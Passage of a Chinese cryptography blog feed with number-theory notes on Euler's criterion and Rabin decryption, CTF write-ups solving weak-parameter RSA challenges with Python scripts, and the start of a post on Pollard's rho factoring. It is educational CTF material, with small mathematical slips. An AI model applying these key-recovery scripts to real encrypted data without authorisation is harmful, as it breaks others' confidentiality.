\frac{p-1}{2} }+1$中必有一个是$P$ 的倍数。因此$d^{ \frac{p-1}{2} }$模$P$的余数必然是1或-1。</p><ul><li>证明若$d$是模$p$二次剩余，则$d^{ \frac{p-1}{2}} \equiv 1 \pmod{p}$</li></ul><p>若$d$是模$p$二次剩余，则存在 $x^2 \equiv d \pmod{p}$，$p$跟$d$和$x$ 互质。根据费马小定理得：</p><p>$d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$</p><ul><li>证明若$d^{ \frac{p-1}{2} } \equiv 1 \pmod{p}$，则$d$是模$p$的二次剩余</li></ul><p>$p$ 是一个奇素数，所以关于$p$的原根存在。设$a$是$p$的一个原根，则存在$1 \le j \le p-1$使得$d=a^j$。于是</p><p> $d^{ \frac{p-1}{2}} \equiv x^{p-1} \equiv 1 \pmod{p}$ </p><p>$a$是$p$的一个原根，因此$a$模$p$的指数是$p-1$，于是$p-1$整除 $\frac{ j(p-1) }{2}$ 。这说明$j$是一个偶数。令 $i = \frac{j}{2}$ ，就有 $(a^i)^2 =a^{2i} = d$ 。$d$是模$p$ 的二次剩余 </p><h3 id="定理2"><a href="#定理2" class="headerlink" title="定理2"></a>定理2</h3><p>二次同余式$x^2 \equiv  c \pmod{p}$的解为：</p><p>​                                                $    x \equiv  ±c^\frac{p+1}{4}  \pmod{p}    $</p><h4 id="证明-2"><a href="#证明-2" class="headerlink" title="证明"></a>证明</h4><p>由于p是素数，显然a与p互素，再由欧拉判别定理， a是模p的平方剩余的充要条件是 ，</p><p>$(c^\frac{1}{2})^{φ(n)} \equiv  1\pmod{p}$</p><p>即$(c^\frac{1}{2})^{p-1} \equiv  1\pmod{p}$</p><p>带入原式，得$x^2 \equiv  c·(c^\frac{1}{2})^{p-1} \equiv  c^\frac{p+1}{2} \equiv  (c^\frac{p+1}{4})^2$</p><p>则</p><p>$x \equiv  ±c^\frac{p+1}{4}  \pmod{p}$</p><h3 id="定理3"><a href="#定理3" class="headerlink" title="定理3"></a>定理3</h3><p>如果整数$c$满足：</p><p>1） $c$为$p$的平方剩余</p><p>2） $c$为$q$的平方剩余</p><p>则：$ c$为$p*q$的平方剩余，解$x$为：</p><p>$x\equiv±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q ± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})·p\pmod{p\cdot q}$</p><h4 id="证明-3"><a href="#证明-3" class="headerlink" title="证明"></a>证明</h4><p>二次同余式：    $x^2 \equiv  c\pmod{p*q}$</p><p>等价于同余式组 ：    $x^2 \equiv  c \pmod{p}$        ①    </p><p>​                                    $x^2 \equiv  c\pmod{q}$        ②</p><p>由定理2</p><p>①式解为    $x \equiv  ±c^\frac{p+1}{4}  \pmod{p}    $</p><p>②式解为    $x \equiv  ±c^\frac{q+1}{4}  \pmod{q}$</p><p>由CRT，解为 $x\equiv±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q ± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})·p\pmod{p\cdot q}$</p><h3 id="Rabin加密"><a href="#Rabin加密" class="headerlink" title="Rabin加密"></a>Rabin加密</h3><p>选择两个大素数$p$和$q$做为私钥</p><p>计算$n = p * q$做为公钥</p><p>若明文为m，则密文为$c \equiv  m^2 \pmod{n}$</p><h3 id="Rabin解密"><a href="#Rabin解密" class="headerlink" title="Rabin解密"></a>Rabin解密</h3><p>我们首先计算出x1和x2，使得</p><p>$x_1^2 \equiv  c \pmod{p}$，①</p><p>$x_2^2 \equiv  c \pmod q)$，②</p><h4 id="i-p和q都是模4余3的数"><a href="#i-p和q都是模4余3的数" class="headerlink" title="i)p和q都是模4余3的数"></a>i)p和q都是模4余3的数</h4><p>由于$p$是素数，显然$c$与$p$互素，再由定理2</p><p>得   </p><p>$x_1 \equiv  ±c^\frac{p+1}{4}  \pmod{p}$</p><p>$x_2 \equiv  ±c^\frac{q+1}{4}  \pmod{q}$</p><p>（一正一负，负的计算可简化为 模-正，如：$-x_1 \equiv  p - x_1  \pmod{p}$）</p><p>从这里可以看出来如果$p$和$q$不是模$4$余$3$的话，c的指数就不是一个整数，也就不能用这个方法计算了</p><p>接着我们求出$p$在模$q$下的逆，设为$a$，即$a*p \equiv  1\pmod{q}$</p><p>然后我们求出$q$在模$p$下的逆，设为$b$，即$b*q \equiv  1 \pmod{p}$</p><p>求出来a，b用于中国剩余定理</p><p>带入 $x\equiv±(c^\frac{p+1}{4}\pmod{p})\cdot(q^{-1}\pmod{p})\cdot q ± (c^\frac{q+1}{4}\pmod{q})\cdot (p^{-1}\pmod{q})·p\pmod{p\cdot q}$</p><p>得    $x \equiv±(c^\frac{p+1}{4}\pmod{p})·b\cdot q ±(c^\frac{q+1}{4}\pmod{q})\cdot a·p   \pmod{n}$</p><p>设$c^\frac{p+1}{4}\pmod{p} $为$cp$，$c^\frac{q+1}{4} \pmod{q}$为$cq$</p><p>$x_1 = (b \cdot q \cdot c_p+a \cdot p \cdot c_q )  \mod n$<br>$-x_1 = n - x_1$<br>$x_2= (b \cdot q \cdot c_p- a \cdot p \cdot c_q)  \mod n$<br>$-x_2 = n - x_2$</p><p>其中有一个为我们想要的明文m。</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">n2s</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> hex(x)[<span class="number">2</span>:].decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">c = </span><br><span class="line">p = </span><br><span class="line">q = </span><br><span class="line">n = p*q</span><br><span class="line">c_p = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">c_q = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x = (b*q*c_p+a*p*c_q)%n</span><br><span class="line">y = (b*q*c_p-a*p*c_q)%n</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> n2s(x)</span><br><span class="line"><span class="keyword">print</span> n2s(n-x)</span><br><span class="line"><span class="keyword">print</span> n2s(y)</span><br><span class="line"><span class="keyword">print</span> n2s(n-y)</span><br></pre></td></tr></table></figure><h4 id="ii-p和q不是模4余3的数"><a href="#ii-p和q不是模4余3的数" class="headerlink" title="ii)p和q不是模4余3的数"></a>ii)p和q不是模4余3的数</h4><p>这里涉及 <a href="https://en.wikipedia.org/wiki/Cipolla's_algorithm" target="_blank" rel="noopener">Cipolla’s algorithm</a> ，<a href="https://xz.aliyun.com/t/5113#toc-4" target="_blank" rel="noopener">先知</a>已经有一篇讲的不错的文章了 </p><h2 id="题目实例"><a href="#题目实例" class="headerlink" title="题目实例"></a>题目实例</h2><h3 id="UNCTF-一句话加密"><a href="#UNCTF-一句话加密" class="headerlink" title="UNCTF - 一句话加密"></a>UNCTF - 一句话加密</h3><p>题目是给了一张图，隐写了一个模n</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">n</span> = <span class="number">0</span>xc2636ae5c3d8e43ffb97ab09028f1aac6c0bf6cd3d70ebca281bffe97fbe30dd</span><br></pre></td></tr></table></figure><p>可以发现n不大，直接用yafu分解可得</p><p><img src="https://i.loli.net/2020/04/30/542OKV3mC7N1PcM.png" alt="UNCTF - 一句话加密"></p><p>但是找不到e，最后试了试rabin，成功破解</p><p>exp用上面的那个就可</p><h3 id="roarctf-babyrsa"><a href="#roarctf-babyrsa" class="headerlink" title="roarctf - babyrsa"></a>roarctf - babyrsa</h3><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">import sympy</span><br><span class="line">import random</span><br><span class="line">def myGetPrime():</span><br><span class="line">    A= getPrime(513)</span><br><span class="line">    <span class="builtin-name">print</span>(A)</span><br><span class="line">    <span class="attribute">B</span>=A-random.randint(1e3,1e5)</span><br><span class="line">    <span class="builtin-name">print</span>(B)</span><br><span class="line">    return sympy.nextPrime((B!)%A)</span><br><span class="line"><span class="attribute">p</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A1=</span></span><br><span class="line"><span class="comment">#B1=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">q</span>=myGetPrime()</span><br><span class="line"><span class="comment">#A2=</span></span><br><span class="line"><span class="comment">#B2=</span></span><br><span class="line"></span><br><span class="line"><span class="attribute">r</span>=myGetPrime()</span><br><span class="line"><span class="attribute">n</span>=p*q*r</span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="attribute">c</span>=pow(flag,e,n)</span><br><span class="line"><span class="comment">#e=0x1001</span></span><br><span class="line"><span class="comment">#c=</span></span><br><span class="line"><span class="comment">#so,what is the flag?</span></span><br></pre></td></tr></table></figure><p>加密中的<strong>(B!)%A</strong>的 <strong>!</strong> 在这里是阶乘的意思，所以显然这里要用到威尔逊定理，不然这么大的一个数的阶乘，根本吃不消好吧</p><p>根据加密逻辑，这里是一个三素数系统，所以$φ(n) = (p-1)<em>(q-1)</em>(r-1)$，然后$r$肯定是要通过先求出$p，q$来得出</p><p>然后关于$p$和$q$，题目给的信息都一样，所以求$p$和求q的解法肯定是一样的，</p><p>所以题目简化为，<strong>根据A1,B1解p</strong></p><p>而$p \equiv (B!)  \pmod{A}$ （B是一个比A小的数）</p><p>虽然A，B均已给出且互素，但显然大数$B$的阶乘是不可能直接求得的，</p><p>所以要用威尔逊定理简化计算</p><p>简化过程如下：</p><p>已知 $B! \equiv  P\pmod{A})$</p><p>由于A是素数，所以有：        $(A-1)! \equiv  -1 \pmod{A}$</p><p>​                   即$(A-1)(A-2)……(B+1)B! \equiv  -1 \pmod{A}$</p><p>​         根据已知$(A-1)(A-2)……(B+1)P \equiv  -1 \pmod{A}$</p><p>​                     变形为$(A-2)……(B+1)P \equiv  1 \pmod{A}$</p><p>所以$p$即为$(A-2)(A-3)……(B+1)$ 在模$A $下的逆</p><p>exp</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line">import sympy</span><br><span class="line"></span><br><span class="line">A1=</span><br><span class="line">B1=</span><br><span class="line">A2=</span><br><span class="line">B2=</span><br><span class="line">n=</span><br><span class="line">e=0x1001</span><br><span class="line">c=</span><br><span class="line"></span><br><span class="line">a = 1</span><br><span class="line">for i in range(A1-2,B1,-1):</span><br><span class="line">    a = a*i % A1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">b = 1</span><br><span class="line">for i in range(A2-2,B2,-1):</span><br><span class="line">    b = b*i % A2</span><br><span class="line">    </span><br><span class="line">p = sympy.nextprime(invert(a,A1))</span><br><span class="line">q = sympy.nextprime(invert(b,A2))</span><br><span class="line">r=n/p/q</span><br><span class="line">phi = (p-1)*(q-1)*(r-1)</span><br><span class="line">d = invert(e,phi)</span><br><span class="line">m=pow(c,d,n)</span><br><span class="line">print hex(m)[2:].decode('hex')</span><br></pre></td></tr></table></figure><h3 id="HECTF-easy-rsa"><a href="#HECTF-easy-rsa" class="headerlink" title="HECTF - easy_rsa"></a>HECTF - easy_rsa</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">from Crypto.Util import number</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="comment">#e = have a try</span></span><br><span class="line">p = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">q = number.getPrime(1024)</span><br><span class="line"></span><br><span class="line">nothing = 251560377963038761190200797029988859033 <span class="comment"># getPrime(128)</span></span><br><span class="line"></span><br><span class="line">n = p*q</span><br><span class="line">fn = (p-1)*(q-1)</span><br><span class="line">d =inverse(e, fn)</span><br><span class="line">something=(p-1)*d+nothing</span><br><span class="line">enc = pow(flag, e, p*q)</span><br><span class="line"></span><br><span class="line"><span class="comment">#n=</span></span><br><span class="line"><span class="comment">#something=</span></span><br><span class="line"><span class="comment">#enc=</span></span><br></pre></td></tr></table></figure><p>题目给了，nothing（下面记为r），something（下面记为s），其中$ (p-1)*d= s - r$</p><p>目的很明确，就是分解大数n</p><p>这一题的思路就是利用$GCD$来约出$n$的因子</p><p>所以首先要获得一个$p$的倍数</p><p>根据费马小定理</p><p>$2^{p-1} \equiv  1 \pmod{p}$显然成立    (主要是为了利用题目中给出的$ (p-1)*d$）</p><p>所以设$A = 2^{p-1} - 1 = kp$</p><p>然后利用欧拉定理，我们直接利用上文中提到的RSA的解密证明中的结论</p><p><img src="https://i.loli.net/2020/04/30/1mkjEzZBHAdD2bW.png" alt="欧拉定理"></p><p>$(2^{p-1})^{ed}  \equiv  (2^{p-1})   \pmod{n}$</p><p>由题，$(p-1)d = s - r$</p><p>所以$A  \equiv  2^{p-1} - 1  \equiv   (2^{p-1})^{ed} - 1 \equiv   2^{es-er} - 1    \pmod{n}$</p><p>所以  $gcd( 2^{es-er} - 1 , n) $</p><p>即      $gcd(kp , pq) $</p><p>即可得到     $p$</p><p>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sympy</span><br><span class="line"></span><br><span class="line">enc=</span><br><span class="line">n=</span><br><span class="line">something=</span><br><span class="line">nothing=</span><br><span class="line">e=<span class="number">1</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        e=sympy.nextprime(e)</span><br><span class="line">        a=pow(<span class="number">2</span>,e*something-e*nothing,n)<span class="number">-1</span></span><br><span class="line">        p=libnum.gcd(a,n)</span><br><span class="line">        q=n/p</span><br><span class="line">        fn=(p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line">        d=invert(e,fn)</span><br><span class="line">        flag=libnum.n2s(pow(enc,d,n))</span><br><span class="line">        <span class="keyword">if</span> <span class="string">"hebtu"</span> <span class="keyword">in</span> flag:</span><br><span class="line">            <span class="keyword">print</span> flag</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">    <span class="keyword">continue</span></span><br></pre></td></tr></table></figure><h3 id="构造GCD"><a href="#构造GCD" class="headerlink" title="构造GCD"></a>构造GCD</h3><p>可以看出，构造gcd来求大数n的因子以此来分解n是一种很好又很巧妙的方式,来看这一题</p><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.number import getPrime, isPrime, getRandomNBitInteger</span><br><span class="line">p = getPrime(512)</span><br><span class="line">q = getPrime(512)</span><br><span class="line">n=p*q</span><br><span class="line"></span><br><span class="line">a=int(pow((q+p),2019,n))</span><br><span class="line">b=int(pow(p+2019,q,n))</span><br><span class="line">n=</span><br><span class="line">a=</span><br><span class="line">b=</span><br></pre></td></tr></table></figure><p>这里，我们要通过已给出的a和b，来分解n</p><p>通过a，b和p，q的关系，我们要想办法用a,b凑出一个GCD来求出n的一个因子</p><p>解题过程如下：</p><p>由$ a \equiv  (p+q)^{2019} \pmod{n}$</p><p>可得    $a \equiv  (p+q)^{2019} \equiv  p^{2019}  \pmod{q}$        【二项式展开定理】</p><p>由$ b \equiv  (p+2019)^q \pmod{n}$</p><p>可得 $b \equiv  (p+2019)^q \equiv  p+2019  \pmod{q}$            【费马小定理：$(p+2019)^q-1 \equiv  1 \pmod{q}$】</p><p>所以$ a \equiv  (b - 2019)^{2019} \pmod{q}$</p><p>​    即$ a =  (b - 2019)^2019 + kq$</p><p>这样我们就可以凑出一个$GCD$</p><p>$GCD（ (b - 2019)^{2019}-a，n）=  GCD（ Kq，n）= q$</p><p>解题完毕</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这一次学习了数论四大定理的证明、应用，以及rabin密码的解法。发现其实很多解法、攻击方法都是多种定理的结合运用，有时候还要引出各种推论，很灵活</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>欧拉定理证明： <a href="https://www.cnblogs.com/wangxiaodai/p/9758242.html" target="_blank" rel="noopener">https://www.cnblogs.com/wangxiaodai/p/9758242.html</a> </p><p>中国剩余定理证明： <a href="https://blog.csdn.net/Rain722/article/details/53230707" target="_blank" rel="noopener">https://blog.csdn.net/Rain722/article/details/53230707</a> </p><p>威尔逊定理证明： <a href="https://www.cnblogs.com/Judge/p/10755703.html" target="_blank" rel="noopener">https://www.cnblogs.com/Judge/p/10755703.html</a> </p><p>Rabin算法： <a href="https://veritas501.space/2017/03/01/密码学笔记/" target="_blank" rel="noopener">https://veritas501.space/2017/03/01/%E5%AF%86%E7%A0%81%E5%AD%A6%E7%AC%94%E8%AE%B0/</a> </p><p> <a href="https://xz.aliyun.com/t/5113" target="_blank" rel="noopener">https://xz.aliyun.com/t/5113</a> </p><p> <a href="https://en.wikipedia.org/wiki/Rabin_cryptosystem" target="_blank" rel="noopener">https://en.wikipedia.org/wiki/Rabin_cryptosystem</a> </p><p> <a href="https://blog.csdn.net/qq_24451605/article/details/45093911" target="_blank" rel="noopener">https://blog.csdn.net/qq_24451605/article/details/45093911</a> </p><p>最后感谢Lur大佬的一手指点</p>]]></content>
      
      
      <categories>
          
          <category> 密码小屋 </category>
          
          <category> Basic </category>
          
      </categories>
      
      
        <tags>
            
            <tag> number theory </tag>
            
            <tag> Abstract algebra </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>密码学学习笔记 之 浅析Pollard&#39;s rho algorithm及其应用</title>
      <link href="/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/"/>
      <url>/2019/11/11/%E5%AF%86%E7%A0%81%E5%AD%A6%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0%E4%B9%8B%E6%B5%85%E6%9E%90Pollard&#39;s%20rho%20algorithm%E5%8F%8A%E5%85%B6%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p>首发于<a href="https://xz.aliyun.com/t/6703" target="_blank" rel="noopener">先知社区</a></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在学密码学，其中有关RSA的内容。由于各种攻击算法的出现，RSA现在其实已经不太安全了(由于不恰当的参数的使用)，但不得不承认的是，当今RSA加密技术还是被普遍应用的~</p><p>然后在做题的时候，遇到了这样一题</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">from Crypto.Util.<span class="keyword">number</span> import getPrime, isPrime</span><br><span class="line">flag = <span class="string">'BCNS&#123;***************&#125;'</span></span><br><span class="line">nbits = <span class="number">2048</span></span><br><span class="line">gbits = <span class="number">1000</span></span><br><span class="line">g = getPrime(<span class="keyword">int</span>(gbits))</span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">a</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    <span class="keyword">p</span> = <span class="number">2</span> * g * <span class="keyword">a</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> isPrime(<span class="keyword">p</span>):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> True:</span><br><span class="line">    <span class="keyword">b</span> = getPrime(<span class="keyword">int</span>(nbits * <span class="number">0.5</span>) - gbits)</span><br><span class="line">    q = <span class="number">2</span> * g * <span class="keyword">b</span> + <span class="number">1</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">p</span> != q <span class="built_in">and</span> isPrime(q):</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"><span class="keyword">N</span> = <span class="keyword">p</span> * q</span><br><span class="line"><span class="keyword">e</span> = <span class="number">65537</span></span><br><span class="line"></span><br><span class="line">def str2int(s):</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">int</span>(s.encode(<span class="string">'hex'</span>), <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'pubkey.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">e</span>) + <span class="string">'\n'</span>)</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(str(<span class="keyword">N</span>) + <span class="string">'\n'</span>)</span><br><span class="line"></span><br><span class="line">plain = str2int(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">c</span> = <span class="built_in">pow</span>(plain, <span class="keyword">e</span>, <span class="keyword">N</span>)</span><br><span class="line">with <span class="keyword">open</span>(<span class="string">'cipher.txt'</span>, <span class="string">'w'</span>) <span class="keyword">as</span> <span class="keyword">f</span>:</span><br><span class="line">    <span class="keyword">f</span>.<span class="keyword">write</span>(hex(<span class="keyword">c</span>))</span><br></pre></td></tr></table></figure><p>这里我们引入<a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.33.1333&rep=rep1&type=pdf" target="_blank" rel="noopener">Further Attacks on Server-Aided RSA Cryptosystems</a></p><p>Further Attacks on Server-Aided RSA Cryptosystems解决的是大数分解的一个问题，</p><p>利用条件是当$N=p*q(N≥512bit)$,其中，$(p-1)$和 $(q-1)$有一个大的公因数β</p><p>在Further Attacks on Server-Aided RSA Cryptosystems的第一个攻击阶段中提到：运用Pollard’s ρ methods ，其中用于取伪随机值的maps函数为 $g(x)=x^{N-1}+3 \pmod {N}$，这将在时间复杂度O($\sqrt{p/β}$)内分解N，因为在$x^{N-1}\pmod{N}$中，至多有 $\frac{(p-1)}{β}+1$个值</p><h2 id="Pollard’s-ρ-algorithm"><a href="#Pollard’s-ρ-algorithm" class="headerlink" title="Pollard’s ρ algorithm"></a>Pollard’s ρ algorithm</h2><p>波拉德的 ρ 算法是整数分解的一种算法。 它是约翰 · 波拉德在1975年发明的。 它只占用了很少的空间，并且它的预期运行时间与被分解的合数的最小质因数大小的平方根成正比</p><h3 id="核心思想"><a href="#核心思想" class="headerlink" title="核心思想"></a>核心思想</h3><p>假设我们需要分解$n$，$n=q*p$，其中$q$为$n$的非平凡因子（即$q$不等于$1$ 或$ n$)。我们需要一个模$n$的多项式，例如：$g(x) \equiv x^2+1 \pmod{n}$，用于生成“伪随机”数列。我们选择一个起始值，例如，$2$，即$x_1=g(2)，x_2=g(g(2))，x<del>3</del>=g(g(g(2)))……$</p><p>这里值得注意的是，这个数列是有限的，由于生日问题，序列 $x_k $mod（$n$）最终会重复，一旦一个序列由重复的值，这个序列就会循环，因为每个值依赖于它之前的值， 这种最终循环的结构产生了“ ρ 算法”的名称</p><p><img src="https://i.loli.net/2020/04/30/P9MQvlALodTsRI2.png" alt="ρ"></p><p>这里我们可以举一个简单的小例子，我们设$n$为640，$g(x)=x^2$，$x$起始值为2，</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    b*=2</span><br><span class="line">    <span class="builtin-name">print</span> b%640</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2020/04/30/Y8631MqfrxRKCmt.png" alt="example"></p><p>我们可以看到，128为这个取模多项式的循环节点，</p><p>回到话题，这里继续用 Floyd’s cycle-finding algorithm发现：设立两个节点，$i$，$j$，在每一步中，$i$每次移动一个节点，$j$每次移动两个节点，然后检查$gcd(x_i-x_j,n)$是否≠1，如果不等于，那么$gcd$的结果便是$p$。并且，这也意味着序列${ x_k \pmod p}$也会重复。这是因为，如果$x_i \equiv x_j \pmod{p}$, 那么$x_i$与$x_j$之间的差必然是$p$的倍数。同时，这也说明，$gcd(x_i-x_j，n)$不等于1的结果无论如何最终都会到来，但是可能是$n$自己，此时，代表Pollard’s ρ algorithm失败了，可以使用不同的起始值，再次运算。</p><h3 id="代码表示"><a href="#代码表示" class="headerlink" title="代码表示"></a>代码表示</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a, b = b, a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">mapx</span><span class="params">(x)</span>:</span></span><br><span class="line">    x=(x*x+<span class="number">1</span>)%n</span><br><span class="line">    <span class="keyword">return</span> x</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pollard_rho</span> <span class="params">(x1,x2)</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        x1=mapx(x1)</span><br><span class="line">        x2=mapx(mapx(x2))</span><br><span class="line">        p=gcd(x1-x2,n)</span><br><span class="line">        <span class="keyword">if</span> (p == n):</span><br><span class="line">            <span class="keyword">print</span> <span class="string">"fail"</span></span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        <span class="keyword">elif</span> (p!=<span class="number">1</span>):</span><br><span class="line">            print(<span class="string">"p: "</span>+str(p))</span><br><span class="line">            print(<span class="string">"q: 